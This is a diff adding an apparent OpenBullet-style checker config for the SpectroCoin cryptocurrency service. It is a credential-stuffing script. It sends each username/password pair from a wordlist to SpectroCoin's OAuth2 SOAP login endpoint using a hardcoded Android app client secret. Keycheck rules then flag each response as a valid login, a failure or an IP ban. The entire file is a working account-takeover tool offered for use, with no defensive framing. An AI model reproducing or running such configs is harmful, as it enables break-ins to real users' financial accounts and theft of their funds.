@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "SpectroCoin",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-02T14:06:05.1018718+01:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://spectrocoin.com/api/oauth2" AutoRedirect=TRUE 
+  CONTENT "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\"><v:Header /><v:Body><n0:authenticateClient xmlns:n0=\"http://interfaces.oauth2.spectrofinance.lt/\"><n0:arg0><n0:client_secret>4fr641sdvfdg5t4jywvo5agrtpgg5vhfMn7qr5aacde44</n0:client_secret><n0:client_id>androidApp</n0:client_id><n0:user_name><USER></n0:user_name><n0:user_pass><PASS></n0:user_pass><n0:version>1.6.2</n0:version><n0:scope>login</n0:scope></n0:arg0></n0:authenticateClient></v:Body></v:Envelope>" 
+  CONTENTTYPE "text/xml;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "login" 
+  KEYCHAIN Failure OR 
+    KEY "with specified credentials not found" 
+  KEYCHAIN Ban OR 
+    KEY "Access from your IP" 
